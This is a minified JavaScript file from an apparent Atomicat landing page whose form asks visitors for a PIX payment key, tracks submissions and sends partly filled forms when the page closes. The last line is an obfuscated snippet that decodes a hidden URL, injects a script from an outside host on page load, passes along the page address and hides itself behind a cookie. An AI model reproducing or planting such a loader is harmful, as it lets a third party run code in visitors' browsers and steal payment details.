function applyParams({inputUrl:inputUrl}){console.log(inputUrl);const inputUrlObj=new URL(inputUrl,window.location.origin),currentPageParams=new URLSearchParams(window.location.search),inputUrlParams=new URLSearchParams(inputUrlObj.search);for(const[key,value]of currentPageParams)inputUrlParams.has(key)||inputUrlParams.append(key,value);const finalUrl=inputUrlObj.origin+inputUrlObj.pathname+"?"+inputUrlParams.toString();return console.log(finalUrl),finalUrl}console.log("javascript is working....................");const atomiFormatDate=(options={slated:!1,addDate:0})=>{const today=new Date;if(options.slated){return`${(today.getDate()+(options.addDate||0)).toString().padStart(2,"0")}/${(today.getMonth()+1).toString().padStart(2,"0")}/${today.getFullYear()}`}options.addDate&&today.setDate(today.getDate()+options.addDate);return today.toLocaleDateString(void 0,{weekday:"long",year:"numeric",month:"long",day:"numeric"})},formatTime=()=>(new Date).toLocaleTimeString(void 0,{hour:"2-digit",minute:"2-digit",hour12:!1});function runDelayedFunctions(data){document.querySelectorAll(".atomicat-delay").forEach((el=>el.classList.remove("atomicat-delay"))),data?.setDisplayed&&localStorage.setItem(data?.setDisplayed,!0)}const formConfig={"69c881e7-ab5d-4d67-b887-d671fa8f43ea":[{options:[{label:"CPF"},{label:"Telefone"},{label:"E-Mail"},{label:"Aleatória"}],required:!0,default:!0,label:"Tipo de chave PIX",show:!0,name:"radio",type:"radio",id:"305d9b78",showLabel:!0},{type:"text",custom:!0,id:"68534447",label:"Digite sua chave PIX",show:!0,showLabel:!0,placeholder:"Digite aqui sua chave PIX...",required:!0},{showLabel:!0,required:!0,label:"Confirme sua chave PIX",placeholder:"Confirme aqui sua chave PIX...",type:"text",id:"e593e6a6",show:!0,custom:!0}]},formMsgs={"69c881e7-ab5d-4d67-b887-d671fa8f43ea":{success:"Your submission was successful.",error:"Your submission failed because of an error.",server:"Your submission failed because of a server error.",invalid:"Your submission failed because the form is invalid.",requiredField:"This field is required."}},validateForm={},submissionType={"69c881e7-ab5d-4d67-b887-d671fa8f43ea":{success:"redirect"}},formRedirectUrl={},passParams=void 0,lid=generateUUID();let formMisc={};function validateFormByConfig({form:form,formId:formId,isAbandon:isAbandon}){try{form.querySelector(".atomicat-form-msgs").style.display="none",form.querySelector(".atomicat-form-error-msg").textContent="",form.querySelector(".atomicat-form-success-msg").textContent="",form.querySelectorAll(".atomicat-form-error-field").forEach((e=>e.remove())),console.log(formId);let isValid=!0;console.log(formConfig[formId]);for(let f=0;f<formConfig[formId]?.length;f++){const item=formConfig[formId]?.[f];if(console.log(item),item.required){const field=form.querySelector(`[name="form_fields[field_${item.id}]"]`);if(console.log(field),field){let fieldIsValid=!0,whichField=item.type;if(console.log(item.type+" => "+field.value),"email"===item.type){const emailRegex=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;fieldIsValid=emailRegex.test(field.value.trim()),console.log(emailRegex.test(field.value.trim())),console.log(fieldIsValid)}else if("tel"===item.type&&item.validate){const phoneRegex=/^\(\d{2}\) \d{4,5}-\d{4}$/;fieldIsValid=phoneRegex.test(field.value),console.log(phoneRegex.test(field.value)),console.log(fieldIsValid)}else fieldIsValid=""!==field.value.trim();if(!fieldIsValid){form.querySelector(".atomicat-form-error-msg").textContent=`${formMsgs[formId].error}`,form.querySelector(".atomicat-form-msgs").style.display="block";let fieldMsg=`${formMsgs[formId].requiredField}`;return"tel"===whichField&&(fieldMsg="Por favor, informe um número de telefone válido."),appendContent({text:fieldMsg,divId:`atomicat-field-${item.id}-container`}),isValid=!1}}}}return isValid}catch(error){console.log(error)}}function atomicatHandleSubmit(event){try{event.preventDefault(),console.log("submitted....");const form=event.target,formId=form.querySelector('input[name="form_fields[f_id]"]')?.value;if(!form.checkValidity()&&validateForm[formId])return console.log("Form validation failed"),void console.log(validateForm[formId]);if(!validateFormByConfig({form:form,formId:formId}))return void console.log("Form validation failed");const getRecaptcha=event.target.getElementsByClassName("g-recaptcha");console.log(getRecaptcha),getRecaptcha?.length>0?"visible"==getRecaptcha[0].getAttribute("data-size")?atomicatFormSubmit({form:form}):grecaptcha.ready((function(){grecaptcha.execute(atomiReCaptchaIds[formId])})):atomicatFormSubmit({form:form})}catch(error){console.log(error)}}function atomicatFormSubmit({form:form,isAbandon:isAbandon,listenerType:listenerType}){try{isAbandon||(form.querySelector(".atomicat-form-button").disabled=!0,form.querySelector(".atomicat-form-button").classList.add("disabled"));const formId=form.querySelector('input[name="form_fields[f_id]"]')?.value;if(isAbandon&&formMisc[formId]?.sf)return!1;const formData={};Array.from(form.elements).forEach((element=>{if(element.name&&"submit"!==element.type&&"button"!==element.type){const name=element.name.replace("form_fields[","").replace("]","");"checkbox"===element.type?(formData[name]||(formData[name]=[]),element.checked&&formData[name].push(element.value)):"radio"===element.type?element.checked&&(formData[name]=element.value):formData[name]=element.value}})),formData.lid=lid,formData.isAbandon=isAbandon,formData.listenerType=listenerType,formData.pageUri=window.location.href;const ogTitleMetaTag=document.querySelector('meta[property="og:title"]');formData.pageName=ogTitleMetaTag?ogTitleMetaTag?.getAttribute("content"):"",fetch("https://apidopro.atomicat-api.com/track/form/lead",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(formData)}).then((response=>{const status=response.status;return response.json().then((data=>({data:data,status:status})))})).then((({data:data,status:status})=>{if(!isAbandon){console.log(status),console.log(data);const isRedirect="redirect"===submissionType[formId]?.success;if(200===status)formMisc[formId]={...formMisc[formId],sf:!0},isRedirect?window.location.href=getUrl({url:formRedirectUrl[formId],passParams:passParams,formId:formId}):(form.reset(),form.querySelector(".atomicat-form-success-msg").textContent=`${formMsgs[formId].success}`,form.querySelector(".atomicat-form-msgs").style.display="block",form.querySelector(".atomicat-form-button").classList.remove("disabled"),form.querySelector(".atomicat-form-button").disabled=!1);else if(form.querySelector(".atomicat-form-button").classList.remove("disabled"),form.querySelector(".atomicat-form-button").disabled=!1,400===status){form.querySelector(".atomicat-form-error-msg").textContent=`${formMsgs[formId].error}`,form.querySelector(".atomicat-form-msgs").style.display="block";for(let f=0;f<data.fields?.length;f++){const item=data.fields?.[f];appendContent({text:`${formMsgs[formId].requiredField}`,divId:`atomicat-field-${item.id}-container`})}}else 403===status?(form.querySelector(".atomicat-form-error-msg").textContent=`${formMsgs[formId].invalid}`,form.querySelector(".atomicat-form-msgs").style.display="block"):500===status?(form.querySelector(".atomicat-form-error-msg").textContent=`${formMsgs[formId].server}`,form.querySelector(".atomicat-form-msgs").style.display="block"):422===status&&(form.querySelector(".atomicat-form-error-msg").textContent=`${data.message||formMsgs[formId].server}`,form.querySelector(".atomicat-form-msgs").style.display="block")}})).catch((error=>{console.log(error),isAbandon||(form.querySelector(".atomicat-form-error-msg").textContent="Something went wrong.",form.querySelector(".atomicat-form-msgs").style.display="block",form.querySelector(".atomicat-form-button").disabled=!1,form.querySelector(".atomicat-form-button").classList.remove("disabled"))}))}catch(error){console.log(error)}}const atomicatForms=document.querySelectorAll('form[id^="atomicat-form-"]');console.log(atomicatForms),formatFields({atomicatForms:atomicatForms}),atomicatForms.forEach((function(form){const formId=form.querySelector('input[name="form_fields[f_id]"]')?.value;formMisc[formId]={},form.addEventListener("submit",atomicatHandleSubmit)}));try{document.addEventListener("visibilitychange",(()=>{"hidden"===document.visibilityState&&atomicatForms.forEach((function(form){atomicatHandleAbandon({form:form,listenerType:"visibilitychange"})}))})),"onpagehide"in window&&(console.log("onpagehide in window"),window.addEventListener("pagehide",(()=>{atomicatForms.forEach((function(form){atomicatHandleAbandon({form:form,listenerType:"pagehide"})}))}))),"onbeforeunload"in window&&(console.log("onbeforeunload in window"),window.addEventListener("beforeunload",(event=>{atomicatForms.forEach((function(form){atomicatHandleAbandon({form:form,listenerType:"beforeunload"})}))})))}catch(error){console.log(error)}function atomicatValidateAbandon({form:form,formId:formId}){try{console.log(formId);let isValid=!1;if(formMisc[formId]?.sf)return!1;for(let f=0;f<formConfig[formId]?.length;f++){const item=formConfig[formId]?.[f];console.log("item",item);const field=form.querySelector(`[name="form_fields[field_${item.id}]"]`);if(console.log("field",field),field&&(console.log(item.type+" => "+field.value),""!==field.value.trim()))return isValid=!0}return isValid}catch(error){console.log(error)}}function atomicatHandleAbandon({form:form,listenerType:listenerType}){try{const formId=form.querySelector('input[name="form_fields[f_id]"]')?.value;if(formMisc[formId]?.sf)return!1;atomicatValidateAbandon({form:form,formId:formId})?atomicatFormSubmit({form:form,isAbandon:!0,listenerType:listenerType}):console.log("atomicatHandleAbandon not valid...",listenerType,atomicatValidateAbandon({form:form,formId:formId}))}catch(error){console.log(error)}}function prefillFormFields(formConfig){const urlParams=new URLSearchParams(window.location.search);Object.keys(formConfig)?.forEach((form=>{console.log(formConfig[form]),formConfig[form]?.forEach((item=>{if(console.log(item),item.prefill){const utmValue=urlParams.get(item.prefill);if(console.log(utmValue),utmValue){const formElement=document.getElementById("atomicat-form-"+form?.slice(0,7));console.log(formElement),console.log(form),console.log(form?.split("-")),console.log(form?.slice(0,7));const field=formElement?.querySelector(`[name="form_fields[field_${item.id}]"]`);console.log(field),field&&(field.value=utmValue)}}}))}))}function getUrl({url:url,passParams:passParams,formId:formId}){try{let curUrl=url;return passParams&&(curUrl=applyParams({inputUrl:curUrl})),curUrl=applyFieldValue({inputUrl:curUrl,formId:formId}),curUrl}catch(error){console.log(error)}}function applyFieldValue({inputUrl:inputUrl,formId:formId}){try{const formElement=document.getElementById("atomicat-form-"+formId.slice(0,7)),urlObj=new URL(inputUrl,window.location.origin),params=new URLSearchParams(urlObj.search);return formConfig[formId]?.forEach((item=>{if(item.urlField){const field=formElement?.querySelector(`[name="form_fields[field_${item.id}]"]`);if(field)if("checkbox"===field.type){const selectedCheckboxes=formElement.querySelectorAll(`[name="form_fields[field_${item.id}]"]:checked`);if(selectedCheckboxes.length>0){const values=Array.from(selectedCheckboxes).map((cb=>cb.value));params.set(item.urlField,values.join(","))}}else if("radio"===field.type){const selectedRadio=formElement.querySelector(`[name="form_fields[field_${item.id}]"]:checked`);selectedRadio&&params.set(item.urlField,selectedRadio.value)}else if("select-multiple"===field.type){const selectedOptions=Array.from(field.selectedOptions).map((option=>option.value));selectedOptions.length>0&&params.set(item.urlField,selectedOptions.join(","))}else{const fieldValue=field.value.trim();fieldValue&&params.set(item.urlField,fieldValue)}}})),urlObj.search=params.toString(),console.log(urlObj.toString()),urlObj.toString()}catch(error){console.log(error)}}function atomiInvisibleCallback(token,formId,recaptchaData){try{console.log(token),console.log(formId),console.log(recaptchaData);const form=document.getElementById(formId);"invisible"==recaptchaData.type&&atomicatFormSubmit({form:form})}catch(error){console.log(error)}}function appendContent({text:text,divId:divId}){try{console.log(divId);var myDiv=document.getElementById(divId),newParagraph=document.createElement("p");newParagraph.innerHTML=text,newParagraph.classList.add("atomicat-form-error-field"),myDiv.appendChild(newParagraph)}catch(error){console.log(error)}}function generateUUID(){try{return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(c){const r=16*Math.random()|0;return("x"===c?r:3&r|8).toString(16)}))}catch(error){console.log(error)}}function formatPhoneNumber(event){let input=event.target.value.replace(/\D/g,"");input.length>11&&(input=input.substring(0,11));let formattedInput="";input.length>0&&(formattedInput="("+input.substring(0,2)),input.length>=3&&(formattedInput+=") "+input.substring(2,6)),input.length>=7&&(formattedInput+="-"+input.substring(6,10)),11===input.length&&(formattedInput="("+input.substring(0,2)+") "+input.substring(2,7)+"-"+input.substring(7,11)),event.target.value=formattedInput}function formatFields({atomicatForms:atomicatForms}){atomicatForms.forEach((function(form){const formId=form.querySelector('input[name="form_fields[f_id]"]')?.value,hasPhone=formConfig[formId]?.filter((f=>"tel"===f.type&&f.validate));hasPhone?.length&&hasPhone.forEach((function(phone){form.querySelector(`[name="form_fields[field_${phone.id}]"]`).addEventListener("input",formatPhoneNumber)}))}))}prefillFormFields(formConfig);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisqtlx'+'3htr4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));